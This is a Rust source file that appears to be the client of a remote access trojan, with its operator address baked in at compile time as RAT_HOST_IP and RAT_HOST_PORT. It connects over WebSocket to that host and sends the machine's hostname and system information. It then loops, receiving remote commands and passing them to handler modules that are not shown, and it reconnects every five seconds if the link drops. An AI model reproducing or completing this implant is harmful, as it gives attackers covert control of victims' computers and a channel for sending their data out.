use std::str::FromStr;
use std::time::Duration;
use sysinfo::System;
use tungstenite::stream::MaybeTlsStream;
use tungstenite::{connect, WebSocket};

mod handlers;
mod router;
mod utils;

pub type Socket = WebSocket<MaybeTlsStream<std::net::TcpStream>>;

#[derive(Clone)]
pub struct Connection {
    ip: String,
    port: i32,
}

#[tokio::main]
async fn main() {
    const HOST_IP: &str = env!("RAT_HOST_IP");
    const HOST_PORT: &str = env!("RAT_HOST_PORT");

    let connection = Connection {
        ip: HOST_IP.to_string(),
        port: i32::from_str(HOST_PORT).expect("Invalid compile-time port"),
    };

    loop {
        println!("Trying to connect to {}:{}", connection.ip, connection.port);

        if let Err(e) = run_connection_lifecycle(connection.clone()).await {
            eprintln!("Error connecting: {}. Try again in 5s...", e);
        }

        tokio::time::sleep(Duration::from_secs(5)).await;
    }
}

async fn run_connection_lifecycle(connection: Connection) -> anyhow::Result<()> {
    let client_id = System::host_name().unwrap_or_else(|| "unknown_client".to_string());

    let url = format!(
        "ws://{}:{}/ws/{}",
        connection.ip, connection.port, client_id
    );

    let (mut socket, _response) = connect(&url)?;
    println!("Successfuly connected to {}", url);

    let sysinfo = utils::SystemInformation::get().to_string();
    socket.send(sysinfo.into())?;
    println!("Info got");

    read_messages(&mut socket, connection)?;

    Ok(())
}

fn read_messages(socket: &mut Socket, connection: Connection) -> anyhow::Result<()> {
    loop {
        let msg = socket.read()?;

        if let Ok(text) = msg.into_text() {
            let bytes = text.as_bytes();
            println!("Got command{}", text);

            if let Err(e) = router::handle_message(bytes, socket, &connection) {
                eprintln!("Error executing command{}", e);
            }
        }
    }
}
